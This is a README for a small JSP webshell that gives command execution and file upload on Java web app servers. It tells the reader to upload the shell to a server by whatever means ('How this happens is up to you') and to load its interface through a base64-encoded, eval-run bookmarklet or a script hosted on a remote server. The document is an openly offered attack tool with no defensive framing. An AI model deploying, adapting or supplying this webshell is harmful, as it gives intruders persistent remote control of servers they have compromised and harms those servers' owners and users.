## A better cmd.jsp

This is a jsp webshell that aims to provide command execution and file upload capability while being as small and widely compatible as possible. To do this, the code for the user interface and client side functionality is contained in javascript which is loaded locally (or hosted elsewhere).

### The files:
##### cmd.jsp
This is the minified version of the webshell.

##### cmd_readable.jsp
This is the readable version of the webshell. The code is identical to cmd.jsp but with tabs and newlines so that it looks decent.

##### cmd.war
This is a compressed version of cmd.jsp for use on web app servers that expect .war files.

##### a.js
This javascript provides the UI and client side functionality.

### How to use (Bookmarklet method):
##### 1: Upload cmd.jsp to a java web app server
How this happens is up to you.
##### 2: Browse to /[wherever you put it]/cmd.jsp
##### 3: Use a bookmarklet to add javascript to the page
Add the code below as a link to your bookmarks bar and click it when you are on the cmd.jsp page. It will add the javascript which provides the user interface and client side functionality. (This contains a.js encoded in base64 for reliable copy/pasting.)
```JavaScript
javascript:{window.localStorage.embed=window.atob("ZG9jdW1lbnQud3JpdGUoIjxwPiIpOw0KdmFyIGh0bWwgPSAiPGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPSdjbWQuanNwJz5cDQo8aW5wdXQgbmFtZT0nYycgdHlwZT10ZXh0PjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUnVuJz5cDQo8L2Zvcm0+PGhyPlwNCjxmb3JtIGFjdGlvbj0nY21kLmpzcCcgbWV0aG9kPXBvc3Q+XA0KVXBsb2FkIGRpcjogPGlucHV0IG5hbWU9J2EnIHR5cGU9dGV4dCB2YWx1ZT0nLic+PGJyPlwNClNlbGVjdCBhIGZpbGUgdG8gdXBsb2FkOiA8aW5wdXQgbmFtZT0nbicgdHlwZT0nZmlsZScgaWQ9J2YnPlwNCjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2InIGlkPSdiJz5cDQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz5cDQo8L2Zvcm0+PGhyPiI7DQp2YXIgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQpkaXYuaW5uZXJIVE1MID0gaHRtbDsNCmRvY3VtZW50LmJvZHkuaW5zZXJ0QmVmb3JlKGRpdiwgZG9jdW1lbnQuYm9keS5maXJzdENoaWxkKTsNCg0KdmFyIGhhbmRsZUZpbGVTZWxlY3QgPSBmdW5jdGlvbihldnQpIHsNCiAgICB2YXIgZmlsZXMgPSBldnQudGFyZ2V0LmZpbGVzOw0KICAgIHZhciBmaWxlID0gZmlsZXNbMF07DQoNCiAgICBpZiAoZmlsZXMgJiYgZmlsZSkgew0KICAgICAgICB2YXIgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCg0KICAgICAgICByZWFkZXIub25sb2FkID0gZnVuY3Rpb24ocmVhZGVyRXZ0KSB7DQogICAgICAgICAgICB2YXIgYmluYXJ5U3RyaW5nID0gcmVhZGVyRXZ0LnRhcmdldC5yZXN1bHQ7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYicpLnZhbHVlID0gYnRvYShiaW5hcnlTdHJpbmcpOw0KICAgICAgICB9Ow0KDQogICAgICAgIHJlYWRlci5yZWFkQXNCaW5hcnlTdHJpbmcoZmlsZSk7DQogICAgfQ0KfTsNCmlmICh3aW5kb3cuRmlsZSAmJiB3aW5kb3cuRmlsZVJlYWRlciAmJiB3aW5kb3cuRmlsZUxpc3QgJiYgd2luZG93LkJsb2IpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGhhbmRsZUZpbGVTZWxlY3QsIGZhbHNlKTsNCn0gZWxzZSB7DQogICAgYWxlcnQoJ1RoZSBGaWxlIEFQSXMgYXJlIG5vdCBmdWxseSBzdXBwb3J0ZWQgaW4gdGhpcyBicm93c2VyLicpOw0KfQ==");eval(window.localStorage.embed);};void(0);
```

### How to use (Hosted JS method):
##### 1: Host a.js somewhere
##### 2: Edit cmd.jsp
Remove the contents of the script tag and specify src="[your server]/a.js"
##### 3: Upload cmd.jsp to a java web app server
How this happens is up to you.
##### 4: Browse to /[wherever you put it]/cmd.jsp
